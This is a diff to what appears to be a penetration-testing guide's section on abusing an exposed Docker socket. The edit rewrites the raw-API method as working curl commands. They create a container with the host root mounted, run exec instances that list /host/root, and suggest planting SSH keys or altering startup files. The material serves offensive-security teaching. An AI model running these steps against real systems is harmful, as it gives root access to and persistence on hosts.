@@ -854,37 +854,56 @@ These commands allow you to run a container with root-level access to the host's
 
 #### **Using Docker API Directly**
 
-In cases where the Docker CLI isn't available, the Docker socket can still be manipulated using the Docker API and `curl` commands.
+In cases where the Docker CLI isn't available, the Docker socket can still be abused using raw HTTP over the Unix socket. The most reliable flow is:
 
-1.  **List Docker Images:** Retrieve the list of available images.
+- create a long-lived helper container with the host root bind-mounted
+- start it
+- create an `exec` instance inside that helper
+- start the `exec` instance and read the output back through the API
 
-    ```bash
-    curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
-    ```
+**List Docker images**
 
-2.  **Create a Container:** Send a request to create a container that mounts the host system's root directory.
+```bash
+curl --unix-socket /var/run/docker.sock http://localhost/images/json
+```
 
-    ```bash
-    curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
-    ```
+**Create and start a helper container**
 
-    Start the newly created container:
+```bash
+HELPER=helper
 
-    ```bash
-    curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
-    ```
+curl --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
+  "http://localhost/v1.47/containers/create?name=${HELPER}"
 
-3.  **Attach to the Container:** Use `socat` to establish a connection to the container, enabling command execution within it.
+curl --unix-socket /var/run/docker.sock \
+  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
+```
 
-    ```bash
-    socat - UNIX-CONNECT:/var/run/docker.sock
-    POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
-    Host:
-    Connection: Upgrade
-    Upgrade: tcp
-    ```
+**Create an exec instance**
 
-After setting up the `socat` connection, you can execute commands directly in the container with root-level access to the host's filesystem.
+```bash
+EXEC_ID=$(
+  curl -s --unix-socket /var/run/docker.sock \
+    -H "Content-Type: application/json" \
+    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
+    "http://localhost/v1.47/containers/${HELPER}/exec" \
+  | tr -d '\n' \
+  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
+)
+```
+
+**Start the exec instance and read the output**
+
+```bash
+curl --unix-socket /var/run/docker.sock \
+  -H "Content-Type: application/json" \
+  -d '{"Detach":false,"Tty":true}' \
+  "http://localhost/v1.47/exec/${EXEC_ID}/start"
+```
+
+This pattern is usually more robust than trying to drive `attach` manually with `socat` or `nc -U`. Once you can create a helper with `/:/host`, you can use additional `exec` instances to read files such as `/host/root/...`, add SSH keys under `/host/root/.ssh`, or modify host startup files.
 
 ### Others
 
